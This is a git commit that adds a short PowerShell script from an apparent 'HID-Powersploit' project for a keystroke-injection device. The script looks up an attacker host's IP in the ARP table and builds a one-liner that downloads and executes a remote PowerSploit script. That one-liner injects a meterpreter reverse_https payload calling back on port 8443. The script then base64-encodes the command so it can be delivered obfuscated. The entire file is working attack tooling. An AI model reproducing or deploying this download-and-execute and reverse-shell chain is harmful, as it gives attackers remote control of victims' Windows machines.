08f76b2c11018ded3bf818b517ecaa84037fd995
Burnd9671 <Burnd9671@gmail.com>
2016-03-07 14:20:17 -0500

    Rename AutoHID-TryCatch-arp.ps1 to AutoHIDv1.ps1

---
+++ auto-hid/AutoHIDv1.ps1
@@ -0,0 +1,19 @@
+﻿$Tablet = "BurnD-Sero"
+$Computer = "BurnD-Machine"
+try {
+    $DevIP = arp -a | select-string "$Computer" |% { $_.ToString().Trim().Split(" ")[0] }
+    }
+catch {
+    try {
+        $DevIP = arp -a | select-string "$Tablet" |% { $_.ToString().Trim().Split(" ")[0] }
+        }
+    catch {
+        EXIT
+        }
+    }
+$url = '"https://github.com/Burnd9671/HID-Powersploit/raw/master/var/www/html/Invoke-Powersploit"'
+$rawcmd = "iex (New-Object Net.WebClient).DownloadString($url); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $DevIP -Lport 8443 -Force"
+Echo $rawcmd > "C:\Users\Bryan Louiselle\Desktop\Raw_Command.txt"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawcmd)
+$obfscmd = [Convert]::ToBase64String($bytes)
+Echo $obfscmd > "C:\Users\Bryan Louiselle\Desktop\Obfuscated_Command.txt"
